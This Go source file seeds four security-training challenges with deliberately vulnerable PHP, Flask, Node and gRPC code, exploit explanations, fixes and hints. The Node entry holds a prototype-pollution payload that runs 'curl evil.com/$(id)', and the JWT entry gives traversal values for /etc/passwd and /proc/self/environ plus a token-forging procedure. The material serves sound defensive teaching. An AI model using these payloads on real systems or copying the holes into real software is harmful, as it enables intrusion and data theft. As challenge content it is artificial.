package main

// OSCP-tier challenges. Each function returns a single challengeSeed.
// Add new ones to buildOSCPChallenges() and they automatically inherit the
// cmd/seed -verify deterministic line gate.
func buildOSCPChallenges() []challengeSeed {
	return []challengeSeed{
		oscpPHPTypeJuggling(),
		oscpPythonJWTKidPathTraversal(),
		oscpNodeServerSideProtoPollutionRCE(),
		oscpGoGRPCStreamAuthBypass(),
	}
}

// ──────────────────────────────────────────────────
// OSCP 1 — PHP loose-comparison auth bypass via magic hash
// Difficulty 4 — Classic but still seen in legacy PHP codebases.
// ──────────────────────────────────────────────────
func oscpPHPTypeJuggling() challengeSeed {
	return challengeSeed{
		title:        "The Magic Number — PHP Type Juggling Auth Bypass",
		slug:         "php-type-juggling-magic-hash-auth-bypass",
		difficulty:   4,
		langSlug:     "php",
		catSlug:      "auth-bypass",
		points:       250,
		cveReference: "CWE-697 (incorrect comparison)",
		description: `A legacy PHP login endpoint authenticates internal staff for a
financial-services back office. The current developer inherited it from a
contractor 5 years ago. Hashing was modernized to MD5 (the original was
plaintext) but the comparison logic was not touched.

The hash table contains 1,200+ staff records, including the central
"sysadmin" account that bootstraps the rest of the platform.

Find the vulnerability that allows an attacker who knows ANY single
username (which is enumerable through the password-reset endpoint) to
log in as that user without knowing the password.`,
		code: `<?php
require_once 'db.php';
require_once 'session.php';

header('Content-Type: application/json');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($username) || empty($password)) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing credentials']);
    exit;
}

$user = db_query_one(
    'SELECT id, username, password_hash, role FROM users WHERE username = ?',
    [$username]
);

if (!$user) {
    http_response_code(401);
    echo json_encode(['error' => 'Invalid credentials']);
    exit;
}

$submitted_hash = md5($password);

if ($submitted_hash == $user['password_hash']) {
    session_start_for_user($user);
    echo json_encode([
        'status' => 'authenticated',
        'role'   => $user['role']
    ]);
} else {
    http_response_code(401);
    echo json_encode(['error' => 'Invalid credentials']);
}
?>`,
		targetVuln: `PHP loose-comparison (type juggling) authentication bypass via the
"magic hash" class of attack.

Two issues compound:

1. The password is hashed with MD5, which is known to admit "magic hash"
preimages: short strings whose MD5 happens to be of the form 0e + 30 digits
(e.g. "240610708" → MD5 "0e462097431906509019562988736854"). A handful of
these magic strings have been publicly indexed for years.

2. The comparison on the hash uses == (loose equality), not === (strict).
When PHP's loose comparison encounters two strings that both look like
"0e…" decimal-only payloads, it coerces them to floats — both become 0.0,
and 0.0 == 0.0 is true. So any stored password whose MD5 happens to be a
magic-hash string can be matched by submitting ANY magic-hash preimage.

About 0.1% of randomly chosen passwords have MD5s of this form. Across
1,200 staff accounts, statistically at least one will be exploitable.
Worse, the contractor seeded admin accounts with common passwords; if any
of those happen to MD5-hash to a magic value, the attacker logs in as
admin with no credentials at all.

The vulnerable line is the == comparison. The MD5 choice contributes
to exploitability because no public magic-hash preimages exist for
cryptographically modern hashes (bcrypt, argon2id, scrypt).`,
		conceptualFix: `Two independent fixes, both required:

1. Replace == with hash_equals():
       if (hash_equals($user['password_hash'], $submitted_hash)) { ... }
   hash_equals performs a constant-time string comparison and never
   coerces operand types. (=== would also fix the type-juggling but is
   not constant-time; for password use cases hash_equals is the right
   primitive.)

2. Stop using MD5 for passwords. Use password_hash() / password_verify()
   with PASSWORD_BCRYPT or PASSWORD_ARGON2ID:
       if (password_verify($password, $user['password_hash'])) { ... }
   password_verify performs a constant-time, type-safe comparison and
   makes magic-hash preimage attacks computationally infeasible.

Defense in depth: rate-limit failed login attempts per username and per
source IP, log magic-hash-shaped submissions as suspicious activity, and
plan a forced password-rotation for all staff to migrate off MD5 hashes.`,
		hints: []string{
			"What's the difference between == and === in PHP, especially when both operands are strings that look like numbers?",
			"Search for 'PHP magic hash' — the term refers to short passwords whose MD5 happens to start with '0e' followed by only digits.",
			"What does PHP do with the string '0e123' in a numeric context?",
		},
		vulnerableLines: []int{27, 29},
	}
}

// ──────────────────────────────────────────────────
// OSCP 2 — JWT `kid` header path traversal + algorithm confusion
// Difficulty 7 — Two bugs that chain into full authentication bypass.
// ──────────────────────────────────────────────────
func oscpPythonJWTKidPathTraversal() challengeSeed {
	return challengeSeed{
		title:        "The Phantom Key — JWT `kid` Header Path Traversal",
		slug:         "python-jwt-kid-header-path-traversal",
		difficulty:   7,
		langSlug:     "python",
		catSlug:      "auth-bypass",
		points:       500,
		cveReference: "CWE-22 + CWE-327 (path traversal chained with algorithm confusion)",
		description: `A Python/Flask API gateway protects a private banking dashboard with
RS256-signed JWTs issued by an upstream identity provider. To support
seamless key rotation the gateway loads the public key for each token
by its key ID (the "kid" header field), reading the corresponding PEM
file from /etc/auth/keys/.

This pattern has been in production for two years. Recently the team
added HS256 to the allowed-algorithms list "for service-to-service
tokens" without changing the key-resolution logic.

Find the vulnerability chain that lets an attacker forge a token for
any user — including the dashboard's break-glass "root" account — using
only files already readable by the gateway process.`,
		code: `import os
import jwt
from flask import Flask, request, jsonify

app = Flask(__name__)

KEYS_DIR = "/etc/auth/keys"

def load_public_key(kid: str) -> bytes:
    key_path = os.path.join(KEYS_DIR, f"{kid}.pem")
    with open(key_path, "rb") as f:
        return f.read()

@app.route("/api/dashboard", methods=["GET"])
def dashboard():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return jsonify({"error": "Missing token"}), 401
    token = auth[len("Bearer "):]

    try:
        headers = jwt.get_unverified_header(token)
        kid = headers.get("kid")
        if not kid:
            return jsonify({"error": "Missing kid header"}), 400

        public_key = load_public_key(kid)

        claims = jwt.decode(
            token,
            public_key,
            algorithms=["RS256", "HS256"],
            options={"verify_aud": False}
        )
        return jsonify({"status": "ok", "user": claims.get("sub")})
    except jwt.InvalidTokenError as e:
        return jsonify({"error": str(e)}), 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)`,
		targetVuln: `Two vulnerabilities chain into a full authentication bypass:

1. PATH TRAVERSAL via the kid header (line 10).
   The kid value from the (unverified) JWT header is concatenated directly
   into a filesystem path via os.path.join. Because os.path.join discards
   earlier components when a later one starts with "/", and accepts ".."
   without normalization, an attacker can set
       kid = "../../../proc/self/environ"
       kid = "../../../etc/passwd"
       kid = "/etc/ssl/certs/ca-certificates.crt"
   and have the gateway read arbitrary files as the JWT "public key".

2. ALGORITHM CONFUSION (line 32).
   The decode call allows BOTH "RS256" and "HS256". jwt.decode trusts the
   alg field in the JWT header to pick which algorithm to apply. When alg
   is "HS256", the second argument (intended as an RSA public key) is
   instead used as the HMAC secret.

Chained exploit:
  (a) Attacker forges a JWT with alg=HS256, kid=../../../etc/issue (or any
      file with predictable, readable contents).
  (b) Attacker computes HMAC-SHA256 over the JWT header+payload using the
      contents of that file as the HMAC secret.
  (c) Attacker submits the forged token. The gateway:
       - parses kid, reads /etc/issue,
       - sees alg=HS256, runs HMAC verification using /etc/issue's bytes
         as the secret,
       - verification passes because the attacker used the same bytes,
       - claims.sub is whatever the attacker put there (e.g. "root").

The vulnerability would still exist with just HS256 alone (algorithm
confusion is the keystone), or with just path traversal alone (an
attacker who can plant a .pem file under KEYS_DIR could sign tokens).
Together they require no privileges at all — the attacker only needs
a predictable, readable file on the host.`,
		conceptualFix: `Fix BOTH bugs; either one alone leaves significant residual risk.

1. Treat the kid as opaque and validate it against an allowlist BEFORE
touching the filesystem:
       VALID_KIDS = {"2024-01", "2024-04", "2024-10"}
       if kid not in VALID_KIDS:
           raise InvalidTokenError("unknown kid")
   Reject anything containing "/", "..", or null bytes. Even better:
   resolve the absolute path with os.path.realpath() and assert it is
   still under KEYS_DIR.

2. Pin the algorithm. Never allow both asymmetric AND symmetric algs in
the same decode() call. For an RS256 identity provider use:
       claims = jwt.decode(token, public_key, algorithms=["RS256"])
   If service-to-service tokens really do need HS256, route them through
   a SEPARATE endpoint with its own decode call and its own secret.

3. Defense in depth:
   - Pull keys from an in-memory JWKS document refreshed on a schedule,
     not from arbitrary filesystem paths.
   - Add aud / iss claim validation (verify_aud should not be disabled).
   - Log decode-with-suspicious-kid events.

4. If migration is hard, use a kid-to-path mapping table:
       KID_TO_PATH = {"2024-01": "/etc/auth/keys/2024-01.pem", ...}
   so the attacker controls only the lookup key, never the path.`,
		hints: []string{
			"What does os.path.join do when one of its components starts with '/' or contains '..'?",
			"jwt.decode trusts the alg header to pick the verification algorithm. What happens if alg=HS256 but the second argument is a public key file?",
			"Find a predictable, readable file on a typical Linux host. Could you use its contents as an HMAC secret?",
		},
		vulnerableLines: []int{10, 32},
	}
}

// ──────────────────────────────────────────────────
// OSCP 3 — Server-side prototype pollution → RCE via lodash.template gadget
// Difficulty 9 — Two-stage attack: pollute Object.prototype, then trigger
// the template-compilation gadget that turns options into executed JS.
// ──────────────────────────────────────────────────
func oscpNodeServerSideProtoPollutionRCE() challengeSeed {
	return challengeSeed{
		title:        "The Polluted Prototype — Server-Side __proto__ → RCE",
		slug:         "nodejs-server-side-proto-pollution-template-rce",
		difficulty:   9,
		langSlug:     "nodejs",
		catSlug:      "prototype-pollution",
		points:       700,
		cveReference: "CVE-2019-10744-class chain (lodash <4.17.12 + naive deep-merge)",
		description: `A Node.js microservice for a digital-marketing platform exposes a
user-preference endpoint that deep-merges JSON request bodies into a
per-user preferences object. The service also exposes a banner-rendering
endpoint that uses lodash.template (locked at 4.17.10 because "upgrading
broke the build").

Both endpoints are reachable from the public web behind a JWT-checking
load balancer. The auth layer prevents tampering with OTHER users'
prefs, but an attacker only needs to mutate their OWN preferences to
escalate.

Find the chain that turns a benign-looking preferences POST into remote
code execution in the Node process.`,
		code: `const express = require('express');
const lodash = require('lodash');

const app = express();
app.use(express.json());

const userPrefs = new Map();

function deepAssign(target, source) {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (typeof target[key] !== 'object' || target[key] === null) {
                target[key] = {};
            }
            deepAssign(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

app.post('/api/prefs/:userId', (req, res) => {
    const userId = req.params.userId;
    if (!userPrefs.has(userId)) {
        userPrefs.set(userId, { theme: 'light', notifications: true });
    }
    const current = userPrefs.get(userId);
    const updated = deepAssign(current, req.body);
    res.json({ status: 'ok', prefs: updated });
});

app.get('/api/banner', (req, res) => {
    const compiled = lodash.template('Hello, <%= name %>!');
    res.send(compiled({ name: 'guest' }));
});

app.listen(3000);`,
		targetVuln: `A two-stage server-side prototype pollution → RCE chain.

STAGE 1 — Prototype pollution via deepAssign (lines 10, 15).
The deepAssign function iterates Object.keys(source) and recurses into
nested objects. When req.body comes from express.json(), JSON.parse
specially preserves "__proto__" as an own property on the resulting
object. Object.keys therefore returns ["__proto__", …], and the
recursion target[key] = target["__proto__"] resolves through the
prototype-setter, giving the next recursion call a target of
Object.prototype itself. Any leaf assignment from then on writes to
Object.prototype.

Attacker payload:
    POST /api/prefs/anything
    Content-Type: application/json
    {"__proto__": {"sourceURL": "\\n);process.mainModule.require('child_process').exec('curl evil.com/$(id)');//"}}

After this request, Object.prototype.sourceURL is set to the gadget
string and EVERY object in the process now sees that property by
inheritance.

STAGE 2 — The lodash.template gadget (line 35).
lodash.template internally constructs its compiled function source via
string concatenation that includes options.sourceURL — used as a
//# sourceURL=... debugger directive. In lodash <= 4.17.10, the source
of those options falls back through ({} as a default), so an inherited
sourceURL on Object.prototype is included in the compiled function
body. The compiled body is then passed to new Function(...) → arbitrary
JS executed inside the Node process.

Net effect: a single POST that the auth layer treats as "the user is
modifying their own prefs" leads to RCE the next time anyone hits the
banner endpoint. Because Object.prototype is process-global, the
pollution survives across requests until the Node process restarts.`,
		conceptualFix: `Multiple independent fixes; apply at least the first two.

1. Filter dangerous keys in deepAssign:
       const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
       for (const key of Object.keys(source)) {
           if (FORBIDDEN.has(key)) continue;
           ...
       }
   Equivalently, switch to Object.create(null) for target maps so they
   have no prototype to pollute.

2. Use a well-maintained merge library that explicitly defends against
   prototype pollution (lodash.merge >= 4.17.12, deepmerge, etc.). Pin
   versions and run npm audit in CI.

3. Validate request bodies against a strict schema (JSON Schema, zod,
   ajv) BEFORE merging. Schemas reject unknown keys and structurally
   prevent __proto__ from appearing in user input.

4. Avoid lodash.template entirely. Use a sandboxed templating engine
   that does not compile to new Function() (mustache, eta in strict
   mode, etc.). If lodash.template is unavoidable, upgrade to
   >= 4.17.15 which guards options against polluted prototypes.

5. Defense in depth: run the Node process with --disallow-code-generation-from-strings
   to break the new Function() gadget at runtime even if pollution
   succeeds (note this also disables Function() and eval()).`,
		hints: []string{
			"What does JSON.parse do when it sees a key named '__proto__'? Is it treated as an own property, or as a setter?",
			"Trace what happens when deepAssign recurses on key='__proto__'. What object does target[key] resolve to?",
			"Read the lodash.template source for how it builds its compiled function. Where does the sourceURL option come from?",
		},
		vulnerableLines: []int{10, 15, 34},
	}
}

// ──────────────────────────────────────────────────
// OSCP 4 — gRPC streaming-RPC auth bypass via missing StreamInterceptor
// Difficulty 7 — Common in services migrated from unary-only to streaming
// without revisiting the interceptor configuration.
// ──────────────────────────────────────────────────
func oscpGoGRPCStreamAuthBypass() challengeSeed {
	return challengeSeed{
		title:        "Trusted Metadata — gRPC Stream-RPC Auth Bypass",
		slug:         "go-grpc-stream-interceptor-missing-auth-bypass",
		difficulty:   7,
		langSlug:     "go",
		catSlug:      "broken-access",
		points:       500,
		cveReference: "CWE-862 (missing authorization on streaming endpoints)",
		description: `A Go gRPC service powers the real-time account-events feed for a
fintech app. The original developer wrote a careful unary interceptor
that validates the Bearer token in the incoming metadata, but later
added a streaming Subscribe RPC for the new mobile push feature.

The service has been in production for 11 months. The auth interceptor
shows up in every unary path's audit log so the team assumed it covered
the streaming path too. Today an internal red-team exercise found that
streaming AccountEvents leak across users without authentication.

Find the configuration gap, then explain why the Subscribe handler
itself is also at fault.`,
		code: `package authsvc

import (
	"context"
	"strings"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

type authKey struct{}

// UnaryAuthInterceptor enforces bearer-token auth for unary RPCs.
func UnaryAuthInterceptor(
	ctx context.Context,
	req any,
	info *grpc.UnaryServerInfo,
	handler grpc.UnaryHandler,
) (any, error) {
	user, err := authenticate(ctx)
	if err != nil {
		return nil, err
	}
	return handler(context.WithValue(ctx, authKey{}, user), req)
}

func authenticate(ctx context.Context) (string, error) {
	md, ok := metadata.FromIncomingContext(ctx)
	if !ok {
		return "", status.Error(codes.Unauthenticated, "missing metadata")
	}
	tokens := md.Get("authorization")
	if len(tokens) == 0 {
		return "", status.Error(codes.Unauthenticated, "missing authorization")
	}
	if !strings.HasPrefix(tokens[0], "Bearer ") {
		return "", status.Error(codes.Unauthenticated, "invalid scheme")
	}
	user, err := verifyJWT(tokens[0][len("Bearer "):])
	if err != nil {
		return "", status.Error(codes.Unauthenticated, "invalid token")
	}
	return user, nil
}

func NewServer() *grpc.Server {
	return grpc.NewServer(
		grpc.UnaryInterceptor(UnaryAuthInterceptor),
	)
}

// AccountStreamingServer handles bi-directional account-event streams.
type AccountStreamingServer struct {
	UnimplementedAccountStreamingServer
	broker *eventBroker
}

func (s *AccountStreamingServer) Subscribe(
	req *SubscribeRequest,
	stream AccountStreaming_SubscribeServer,
) error {
	for event := range s.broker.subscribe(req.AccountId) {
		if err := stream.Send(&AccountEvent{
			AccountId:    req.AccountId,
			EventType:    event.Type,
			BalanceCents: event.BalanceCents,
			Timestamp:    event.Timestamp,
		}); err != nil {
			return err
		}
	}
	return nil
}

func verifyJWT(token string) (string, error) {
	return parseAndValidate(token)
}`,
		targetVuln: `Two compounding flaws:

1. INTERCEPTOR ASYMMETRY (line 51).
   NewServer registers only grpc.UnaryInterceptor(UnaryAuthInterceptor).
   grpc-go has SEPARATE interceptor chains for unary and streaming RPCs
   — registering one does not register the other. The Subscribe RPC is
   a server-streaming method, so it bypasses UnaryAuthInterceptor
   entirely. Without a companion grpc.StreamInterceptor, every streaming
   RPC reaches its handler with NO authentication check.

2. NO IN-HANDLER AUTH (line 64).
   The Subscribe handler reads req.AccountId straight from the request
   and subscribes to that account's event stream. There is no check
   that the caller is allowed to read THIS account's events. Even if
   the streaming interceptor existed, the handler would still trust
   req.AccountId blindly — a logged-in user "alice" could request
   bob's events.

Exploit:
   Any anonymous TCP client (or curl-grpc) can dial the service, open
   the Subscribe stream, and pass any account_id they like. The broker
   happily ships every event for that account, including transaction
   amounts and balance updates — to a caller with no credentials at all.

This pattern is endemic in services that started life as unary-only and
added streaming as a feature. The auth interceptor was correct on day
one; the regression came in silently when the streaming method was
added.`,
		conceptualFix: `Three fixes; the first two are mandatory.

1. Register a StreamInterceptor alongside the unary one. The auth
logic factors out; just wrap it:

    func StreamAuthInterceptor(
        srv any,
        ss grpc.ServerStream,
        info *grpc.StreamServerInfo,
        handler grpc.StreamHandler,
    ) error {
        user, err := authenticate(ss.Context())
        if err != nil {
            return err
        }
        wrapped := &authedStream{ServerStream: ss, user: user}
        return handler(srv, wrapped)
    }

    func NewServer() *grpc.Server {
        return grpc.NewServer(
            grpc.UnaryInterceptor(UnaryAuthInterceptor),
            grpc.StreamInterceptor(StreamAuthInterceptor),
        )
    }

   Use a wrapped ServerStream so the handler can pull the authenticated
   user via ss.Context().Value(authKey{}).

2. Enforce per-resource authorization inside the handler. Authentication
proves WHO the caller is; authorization proves they're allowed to read
THIS account.

    user := stream.Context().Value(authKey{}).(string)
    if !accountAccessControl.CanRead(user, req.AccountId) {
        return status.Error(codes.PermissionDenied, "forbidden")
    }

3. Defense in depth:
   - Use go-grpc-middleware to compose ratelimit + auth + logging
     interceptors uniformly across unary and stream.
   - Add an integration test that asserts UNAUTHENTICATED is returned
     for both unary AND streaming calls with a missing/invalid token.
   - Audit-log every Subscribe call with the authenticated subject and
     the requested account_id — internal red-teams can spot leakage
     fast.`,
		hints: []string{
			"In grpc-go, what's the relationship between grpc.UnaryInterceptor and grpc.StreamInterceptor? Does one imply the other?",
			"Trace a Subscribe RPC from the client to the handler. Which interceptor chain does it pass through?",
			"Even if the interceptor ran, the Subscribe method itself takes req.AccountId at face value. Is there an authorization check inside the handler body?",
		},
		vulnerableLines: []int{50, 64},
	}
}

